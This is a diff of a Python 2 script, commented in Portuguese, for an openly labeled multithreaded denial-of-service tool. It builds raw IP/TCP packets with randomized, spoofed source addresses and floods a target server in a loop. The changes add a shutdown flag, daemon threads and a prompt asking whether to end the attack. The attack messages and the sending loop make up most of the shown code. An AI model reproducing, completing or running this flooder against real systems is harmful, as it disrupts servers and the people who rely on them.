@@ -8,7 +8,8 @@ from struct import *
 from threading import Thread
 import time 
 
- 
+flag_encerra_threads = False
+
 # checksum functions needed for calculation checksum
 def checksum(msg):
     s = 0
@@ -25,18 +26,18 @@ def checksum(msg):
     return s
 
 def menu():
-    x= input('\nDigite o numero de threads que serao ativadas ')
+    x = input('Digite o numero de threads que serao ativadas ')
 
     return x
 
 
 def show_begin():
     import time
-    print 'Inciando o ataque...\n\n'
+    print 'Inciando o ataque...\n'
     time.sleep(3) 
 
 def show_who(ip,numero):
-    print ' O servidor ',ip,'esta sendo pela thread ',numero
+    print ' O servidor ',ip,'esta sendo atacado pela thread ',numero
 
 def attack(numero_thread): 
     #create a raw socket
@@ -105,7 +106,7 @@ def attack(numero_thread):
     #print 'O servidor',dest_ip,'esta sendo atacado'
     contador=0
     #put the above line in a loop like while 1: if you want to flood
-    while True:
+    while not flag_encerra_threads:
         #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
         #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
         #para evitar que sejam todos 255 ou tenha 0.0.0.0
@@ -138,9 +139,9 @@ def attack(numero_thread):
         packet = ip_header + tcp_header
 
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
-        contador= contador + 1
+        contador = contador + 1
 
-    
+    s.close() # encerra o socket
 
 def count_time(max):
     import time
@@ -173,7 +174,30 @@ def main():
 	show_begin()
 
 	for i in range (0, qnt):
+		ataque[i].setDaemon(True)
 		ataque[i].start()
+
+	while True:
+		time.sleep(20)
+		resp = raw_input('Deseja encerrar o ataque(0 ou 1)? ')
+		if(resp == '1'):
+ 			flag_encerra_threads = True
+ 			break
+		
+
+
+	# contador = 0
+	# #Vai ser um loop no programa principal
+	# #A cada 10000 no contador, o usuario pode escolher parar de enviar pacotes digitando 1, senao, continua
+	# while True:
+	# 	if(contador == 50000):
+	# 		contador = 0
+	# 		resp = raw_input('Deseja encerrar o ataque? 0 ou 1\n')
+	# 		if(resp == '1'):
+	# 			flag_encerra_threads = True
+	# 			break
+		
+	# 	contador += 1
 
 	# ataque2.start()
 	# ataque1.start()
@@ -182,9 +206,5 @@ def main():
 	#time.start()
 
 
-try:
-	main()
-except KeyboardInterrupt:
-	for thr in ataque:
-		thr.join()
+main()
 
